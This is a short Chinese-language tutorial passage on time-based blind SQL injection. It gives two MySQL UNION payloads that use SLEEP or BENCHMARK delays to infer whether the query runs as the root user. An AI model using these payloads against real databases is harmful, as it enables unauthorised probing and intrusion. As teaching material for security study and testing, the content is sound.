### 按照单词进行盲注
可进行的最简单的推断是我们是否在作为超级用户运行查询:
1. 使用sleep函数
```sql
SELECT count(*) FROM reviews WHERE review_auther='MadBob' UNION
SELECT IF(SUBSTRING(USER(),1,4)='root',SLEEP(5),1)；
```
2.使用BENCHMARK函数
```sql
SELECT count(*) FROM reviews WHERE review_auther='MadBob' UNION
SELECT IF(SUBSTRING(USER(),1,4)='root',BENCHMARK(100000,RAND()),1);
```
